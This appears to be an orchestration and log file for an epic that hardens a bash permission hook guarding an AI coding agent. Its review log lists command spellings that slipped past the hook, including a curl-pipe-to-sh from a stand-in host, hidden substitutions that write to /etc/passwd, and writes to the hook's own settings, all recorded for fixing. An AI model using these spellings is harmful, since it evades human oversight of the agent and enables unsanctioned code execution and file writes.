# Epic 41 — State & orchestration

**For the implementing orchestrator.** Read this first, then [brd.md](./brd.md).
Each task file is written for a fresh-context agent and carries its own "read
first" refs, tests and done criteria. This file owns **ordering**, the **shared
edit points** and the **cross-task invariants**.

**No Phase 0.** The one cross-cutting decision — how unresolvable write targets
are classified — was answered by the operator on 2026-10-20 (option (a), brd
D6) and is locked in 41-03.

**Numbering.** Highest existing epic is 40; this is 41. It amends epic 40's
state.md invariant 4 (41-03 does the edit).

**No epic `architecture.md`.** This epic changes which roots one gate accepts
and where settings are read from — no new structure. The repo-root
`architecture.md` is the relevant document; 41-02, 41-03 and 41-05 update it.

## Tasks

Run in table order, one at a time. The implementer model is the filename
suffix.

| # | Task | Status | Depends on | Notes |
|---|------|--------|------------|-------|
| 41-01 | [The gate reads the real target](./41-01-the-gate-reads-the-real-target_opus.md) | done | — | **Security fix first.** Five fail-open groups in every mode (brd §1.3): substitution and glued targets, unscanned inner redirects, quoting, the lenient fallback's `~` / `..`, and redirects into the hook's own settings. Also the `/dev/null)` paren bug. Its report carries the testing baseline. |
| 41-05 | [Settings follow the project root](./41-05-settings-follow-the-project-root_sonnet.md) | done | — | One settings-root resolver (`CLAUDE_PROJECT_DIR` → git top level) for the hook's reads and the Whitelist button's writes; `settings_root` stored on the request row. Added after filing, hence the number. |
| 41-02 | [Allowed write roots mirror Claude Code](./41-02-allowed-roots-mirror-claude-code_opus.md) | done | 41-01, 41-05 | Project root, own memory dir (registered-worktree key with an encoding self-check, user-level `autoMemoryDirectory`; deferring modes only until H5 is verified), user-level `additionalDirectories`; `write_roots` stored on the row for the router and MCP. Redirect gate + `rm` only. |
| 41-03 | [Unresolvable targets are unknowns](./41-03-unresolvable-targets-are-unknowns_opus.md) | done | 41-01, 41-02 | Operator answered (a). 181 of 365 refused targets. Card wording, MCP human-only tier. Amends epic 40 invariant 4. |
| — | `./install.sh --yes` | todo | 41-03 committed | The orchestrator runs it once all four are committed (never `--all`). Not an agent task. |
| 41-04 | [Re-measure and live checks](./41-04-remeasure-and-live-checks_human.md) | todo | install | **human** — live checks H1/H2/H5 and the Whitelist-from-subdir check right after install; the tally after a week. Leave `blocked — awaiting human` once install has run. |

## Dependency graph

```
41-01 ──┬──► 41-02 ──► 41-03 ──► install ──► 41-04 (human)
41-05 ──┘
```

- 41-01 first: 41-02 and 41-03 reason about "the target", and until 41-01 lands
  that is sometimes the wrong string.
- 41-05 is independent of 41-01; 41-02 needs it because its project root is
  41-05's resolver and its `write_roots` row field sits next to 41-05's
  `settings_root`.
- 41-03 after 41-02: its bucket rule asks "is the literal anchor inside the
  allowed roots", and 41-02 changes the roots.

## Shared edit points

| File | 41-01 | 41-05 | 41-02 | 41-03 |
|---|---|---|---|---|
| `bash_command_parser.py` `_scan_write_targets` (`:2051`) | target reassembly, `)` | — | — | — |
| `pretool_hook.py` `_unresolved_target_allowed` (was `_literal_prefix_inside_allowed_roots`), `_is_redirect_target_allowed` (`:912`) | `..`, `~`, protected paths | — | memory carve-out | outcome function beside it |
| `pretool_hook.py` `_allowed_roots` (`:884`), validator constructor (`:592`) | — | — | extra roots | — |
| `pretool_hook.py` `main()` (`:2163-2167`), `replay_from_log` (`:528`) | — | settings root | extra roots from payload | — |
| `pretool_hook.py` `validate_bash_command` decision block (`:709-757`) | — | — | — | precedence, `unresolved_redirect_targets` |
| `project_key.py` | — | `resolve_settings_root` | — | — |
| `settings_loader.py` normaliser (`:102`), or a direct read of `~/.claude/settings.json` | — | — | user-level `additionalDirectories`, `autoMemory*` | — |
| `permission_state_store.py`, `permission_request_hook.py` (`:1636`) | — | `settings_root` | `write_roots` | — |
| `telegram_permission_router.py` validator (`:456`), Whitelist (`:1172`) | — | row's `settings_root` | row's `write_roots` | — |
| `telegram_permission_router.py` `BashAnnotations` / card (`:379-670`) | — | — | — | unresolved heading |
| `permissions-mcp/permissions_mcp_lib.py` `_build_validator` (`:193`; second caller `find_deny_collision` `:953`), tiering (`:326-340`) | — | row's `settings_root` | row's `write_roots` | unresolved → human-only |
| `architecture.md` (`:112` and settings mentions) | — | ✓ | ✓ | ✓ |
| epic 40 `state.md` invariant 4 + Log | — | — | — | ✓ |
| `tests/test_integration_pretool.py` `TestRedirectTargets` (`:1450`) | ✓ | — | ✓ | ✓ |

Line numbers are as of 3585d41; each task shifts the next one's. Re-locate by
name.

## Testing baseline

At 3585d41 (2026-10-20): `python3 tests/run_all_tests.py` → **2010 tests,
`OK (skipped=2)`** (from that commit's message, not re-run at filing). 41-01's
implementer re-measures on a clean tree before the first edit and puts the
result in its report; **the orchestrator copies it here**. Later tasks report
against that number.

**Measured by 41-01 on a clean tree before its first edit (2026-10-20):**
`python3 tests/run_all_tests.py` → **`Ran 2010 tests`, `OK (skipped=2)`**.
Skipped: `test_unit_python_compat.TestImportUnderOldInterpreter.test_all_hook_modules_import`
(no pre-3.11 interpreter with tomli) and
`test_unit_amux_spawn.TestLiveSpawn.test_headless_spawn` (live spawn, needs
`AMUX_SPAWN_LIVE_TEST=1`). After 41-01: 2034 tests, `OK (skipped=2)`, same two.

## Cross-task invariants

1. **Deny is unconditional** (epic 40 invariant 1, unchanged).
2. **Never vouch for what the gate cannot read.** No change in this epic may
   turn a target the gate does not fully understand into an `allow`. An
   unresolvable target with no literal anchor is at most *silent in a
   deferring mode* (41-03).
3. **Known-escaping writes ask in every mode.** A target that resolves outside
   the allowed roots, hits a protected path (brd D4), or is unresolvable with a
   literal anchor outside the roots or a literal `..`, emits `ask` in every
   mode, `bypassPermissions` included (where it is an audit row: the
   PermissionRequest hook auto-allows it, brd §1.1). A *resolved* `..` is
   judged on its realpath.
4. **Allowed roots are exact, and the agent cannot widen them.** Own project
   root, own memory dir (or `autoMemoryDirectory`), `additionalDirectories`,
   `/tmp` — the last three read from `~/.claude/settings.json` only, never
   from project or local settings files (repo- or agent-writable). Never
   `~/.claude` (except the own memory dir), never `~/.claude/projects`, never a
   sibling project's memory dir, never `<root>/.claude/settings*.json` or
   `<root>/.claude/hooks/`, even when a root contains them.
5. **Telegram mirrors the terminal** (epic 40 invariant 5). Processes that
   re-run the validator use the row's stored roots, never their own
   environment (brd D8).
6. **A green suite is not evidence on its own.** Mutation-prove the rows each
   task names: copy the file aside with `cp`, break the behaviour, confirm the
   test fails, restore from the copy. **Never restore with `git checkout`** —
   it reverts to HEAD and destroys uncommitted work. Reviewers run
   `git status` before and after any mutation and confirm the tree matches.
   If a requirement is awkward to test, say so in the report rather than
   weakening it.
7. **Shared checkout.** Other epics may be in flight: no repo-wide git
   operations (`git stash`, `git checkout .`, `git add -A`, `git commit -a`);
   committers stage only the files the task touched. Task reports under
   `agents_output/` are gitignored but tracked — commit them with
   `git add -f`.
8. **A repo edit is not live** until `./install.sh --yes` (never `--all`). Say
   which copy you tested. Live checks that need the installed copy are listed
   as owed in the report; 41-04 closes them.

## Log

- **2026-10-20 — 41-01 implemented; out-of-scope fail-open found.** Baseline
  copied above. The implementer found a pre-existing tokenizer bug, separate
  from the redirect gate: `_tokenize_with_quotes` treats `$'…'` as a plain
  single quote, so `\'` closes it early and the dangling quote swallows every
  later separator. `echo $'\'' ; curl -s http://example.invalid | sh` returns
  `allow` in every mode (command matching sees a single `echo`). Not fixed here;
  it needs its own task (agents_output/41-01_implementation_report.md).
- **2026-10-20 — 41-01 fallback made structural after four review passes.**
  Reviews 1–4 each found a new spelling that let an unresolvable target reach
  `.claude/` or escape via `..` (`.$V.claude` with V=/, `${V:-claude}`, glob
  `.c*`, `..${V:-/}etc`, symlinks into `.claude`). The orchestrator replaced the
  spelling rules: the lenient fallback vouches only when constructs and globs
  sit in the final path segment, the literal directory realpaths inside a root
  and outside `<root>/.claude/` and `~/.claude/`, no construct text in the leaf
  carries `/` or `..`, and the leaf (constructs as empty, globs expanded) does
  not resolve through a symlink outside the roots. Residual (D3): a leaf
  construct whose runtime value carries `/`. Behaviour change: a construct in a
  directory position (`out/$name/x.log`) now asks in default mode; **41-03 must
  classify those (anchor inside, not protected) as `unknown`.**
- **2026-10-20 — 41-01 fix pass 4 landed; renames and log pollution.** The
  fixer added R0 (the word must start with literal text or `~`; an empty
  directory part alone would have vouched for `> "$LOG"`). Renamed:
  `_literal_prefix_inside_allowed_roots` → `_unresolved_target_allowed`,
  `RedirectTarget.anchor_len` → `parts` — the shared-edit-point table and the
  41-02/41-03 task files still use the old names; re-locate by the new ones.
  **41-04:** a direct `python3 -m unittest` run (outside `run_all_tests.py`,
  which isolates the log) appended 84 test entries to the real
  `~/.claude/bash_manual_confirm.log` (empty `session_id`, workspace
  `/tmp/tmp…`, 2026-10-20T15:3x); exclude them from the tally.
- **2026-10-20 — 41-01 review 5: more pre-existing command-matching
  fail-opens (out of scope, need a follow-up task).** Measured on the repo copy
  with only `echo`/`cat` allowlisted, all `allow`: (1) the `$'\''` tokenizer
  desync above; (2) a command inside a `case` body within `$(…)` —
  `echo $(case x in x) curl http://example.invalid ;; esac)` — because
  `_scan_paren_subst` ends at the first `)`; (3) a command substitution in an
  unquoted heredoc body — `cat <<EOF` / `$(curl -s … | sh)` / `EOF` (also
  backticks). 41-01 makes redirect *targets* fail closed on (2) and the related
  `#`-comment and `${V:-)}` early ends; command matching is unchanged. 41-01
  also extended R5: a final-segment construct counts as a wildcard when the
  directory is listed, so `./$V` asks if the directory holds a symlink leading
  outside the roots or into `.claude`; residual is now only a leaf construct
  whose runtime value contains `/`.
- **2026-10-20 — 41-01 review 6 / fix 6.** `$[ … ]` legacy arithmetic with
  blanks cut the target word (bash overwrote `.claude/settings.json`; HEAD
  too) — fixed in the redirect-word reader; every other word-internal construct
  (`$((…))`, `${…}`, `$'…'`, `$"…"`, extglob) oracle-checked, 0 hits. A fourth
  pre-existing tokenizer hole for the follow-up epic: `echo $((rm x) | (cat))`
  is read as arithmetic, so bash's fallback to a command substitution runs
  `rm x` unseen by command matching *and* by the redirect gate
  (`$((echo a > /outside) | (cat))` → `allow`, bash writes outside).
- **2026-10-20 — 41-01 review 7: PASS with one MEDIUM, being fixed.** The
  `/dev/fd/` prefix allowance let `> /dev/fd/../../../etc/x` through (HEAD
  too); fix pass 7 makes the `/dev` sinks exact matches. Also recorded, out of
  41-01's scope and pre-existing: relative targets are judged against the
  payload cwd, so an in-command `cd` moves the write unseen —
  `cd /etc && echo k > x` → `allow`. Candidate for the follow-up epic (or
  41-02, which owns roots and cwd).
- **2026-10-20 — 41-01 done.** Review 9 PASS (2 cosmetic LOWs accepted: the
  `/dev/fd/[^/]+` link pattern is broader than `[0-9]+`, safe-side; the
  `_is_redirect_target_allowed` docstring does not yet name the per-process-link
  refusal, which its helper documents). Final suite 2052 tests, `OK
  (skipped=2)`. Reports: `agents_output/41-01_*` (implementation, review 1–9,
  fix 1–8). Repo copy only; not installed.
- **2026-10-20 — 41-01 committed (10e2a0b). 41-05 done.** Review 2 PASS
  (pass-1 LOW, cosmetic naming in `replay_from_log`, accepted). Suite 2073,
  `OK (skipped=2)`. For 41-02: resolver `project_key.resolve_settings_root`,
  row field `settings_root`, shared fallback `settings_root_for_row`. Old rows
  fall back to `resolve_workspace_root(row.cwd)` in both the router and the
  MCP. **Owed to 41-04:** H1 (`CLAUDE_PROJECT_DIR` in the installed PreToolUse
  and PermissionRequest env, main + worktree session; debug lines added) and
  the Whitelist-from-subdir check. Stray `settings.local.json` below a git top
  level, left for the operator: `dr_remi/hipaa_form/frontend-react/.claude/`
  and `asafechoice/formdr_replacement.bak-oct-14-2025/frontend-react/.claude/`.
- **2026-10-20 — 41-05 committed (6772917). 41-02 done.** Review 3 PASS (one
  LOW accepted: `rm -rf /` from cwd `/` now asks where HEAD allowed — a
  tightening). Suite 2129, `OK (skipped=2)`. In scope beyond the task file:
  deny/ask matching now runs **before** the workspace-`rm` and
  workspace-binary shortcuts — at HEAD a `Bash(rm:*)` deny did not stop
  `rm /tmp/zz` (invariant 1). `/` in `additionalDirectories` is a root; cwd
  `/` is unchanged. Root computation fails safe (no extra roots, gate still
  runs). For 41-03: `pretool_hook.compute_write_roots`,
  `BashPermissionValidator(extra_roots=…)` (`self.extra_roots`,
  `self.memory_roots`), row field `write_roots`. Recorded limits (H6 family):
  a tampered row's `write_roots`; worktree registration via an allowlisted
  `git worktree add`. **Owed to 41-04:** `transcript_path` in a Bash
  PreToolUse payload (main + worktree; `CLAUDE_HOOK_DEBUG=1` lines added), H5,
  acceptance 3 in a live auto session. The operator asked (2026-10-20) for an
  install as soon as safe and again at the end of the epic: the first install
  runs after this commit, before 41-03 starts.
- **2026-10-20 23:41 — interim install (operator's request).** 41-02
  committed (2df3c12); clean tree; `./install.sh --yes` exit 0, all 20
  installed `~/.claude/hooks/*.py` byte-identical to the repo at 2df3c12
  (`test_task03.py` is not an installed file). Settings backup
  `~/.claude/backups/settings.json.20261020_234111.bak`. Live now: 41-01, 41-05,
  41-02. Until 41-03 lands, 41-01's stricter unresolvable-target refusals
  (e.g. a construct in a directory position) are `risk` asks in auto mode too.
  The final install after 41-03 is still owed.
- **2026-10-21 — 41-03 done.** Review 2 PASS (0 issues). Suite 2151,
  `OK (skipped=2)`. Unresolvable targets are classified in one place from the
  rule that refused them: **risk** when the gate can name a concrete escape
  (R2 outside, R3 protected incl. fd links, a literal `..`, visible `.claude`,
  unexpandable `~user`, an R5 match outside/protected — directory segments
  only when they hold a literal character or a glob — and the UNREAD/UNPROVEN
  sentinels); **unknown** for an empty anchor, the truncation marker, and
  R1/R4 refusals inside the roots (incl. an all-construct directory segment:
  `./"$dir"/x`, `out/$name/x.log`). HEAD-vs-change fuzz: 109,532 comparisons,
  0 flips to allow, every change risk → unknown. MCP keeps unresolved rows
  human-only. Epic 40 invariant 4 amended. **Owed to 41-04:** auto-session
  checks that unresolved targets are silent (`emitted: null`, new reason) and
  `~/.bashrc$V` still prompts; the harness-raised card's 🤖 line and 📝
  section.
- **2026-10-20 — fresh-context review; rev 3.** An independent reviewer
  reproduced brd §1.3 and the §1.2 tally, and found more fail-opens, all
  confirmed: quoting only stripped once (`> "/etc"/x`, `> "$HOME"/.bashrc`,
  `> {/etc/x,}`), redirects inside a target substitution never scanned
  (`> $(echo x > /etc/passwd)`), and the hook's own settings writable through
  the gate (`> .claude/settings.local.json` → `allow`). All now in 41-01.
  Also: the `..` rule now applies to unresolvable targets only;
  `additionalDirectories` / `autoMemoryDirectory` come from user settings only
  (an agent could otherwise widen its own roots); the worktree memory root
  needs a registered worktree and a key-encoding self-check; the memory root
  ships for deferring modes only until H5 is verified, computed in `main()` so
  the validator stays mode-unaware; 41-03 gains the MCP human-only tier and the
  card branch for an allowlisted command; 41-04's tally read `emitted` as a
  dict (it is a string). The reviewer's request to re-confirm (a) for
  `bypassPermissions` was resolved without the operator: the PermissionRequest
  hook already auto-allows every request in bypass mode, so the gate is an
  audit trail there and (a) costs only the row; `$HOME/.bashrc` resolves
  through `expandvars` and stays risk. 41-02 and 41-03 moved to opus.

- **2026-10-20 — review pass before handover; rev 2.** Operator chose 41-03
  option (a). The review found: two more fail-opens in the lenient fallback
  (`~` never expanded, `..` checked in the prefix only — brd §1.3 (ii)), now in
  41-01; 41-01's `x$(echo y)` row contradicted the documented lenient design
  (now `allow`, anchored inside); the router and permissions MCP re-run the
  validator without the payload, so 41-02 stores `write_roots` on the row
  (D7); `SettingsLoader` drops `additionalDirectories`; the CLI's
  `autoMemoryDirectory` / `autoMemoryEnabled` settings; (a) needed a precise
  bucket rule (anchored-outside and `..` stay risk) and card wording that does
  not claim the gate asked; 41-04's tally filtered on the reason prefix, which
  (a) changes; model suffixes, the install step and 41-03 → after 41-02 were
  missing. Files renamed for the suffixes.
- **2026-10-20 — 41-05 added.** The operator asked how to fix brd H4 (settings
  read from the cwd); renaming `.claude/` was considered and rejected (brd
  §2.1). The fix reuses `project_key.resolve_workspace_root` as the fallback so
  the hook's reads agree with the permissions MCP's existing writes
  (`permissions_mcp_lib.py:1038`), and stores the root on the request row for
  the Whitelist button, which runs later in another process.
- **2026-10-20 — filed, spec only.** From the operator's memory-write card in
  an auto-mode `tradingtips` session. Diagnosis in brd §1; the `$(…)` fail-open
  (brd §1.3) was found while checking whether the paren fix was safe. No code
  was changed: the parser fix is security-sensitive and the roots change
  touches `rm` and settings resolution, so both go through the normal
  implement → review → mutation-proof loop.
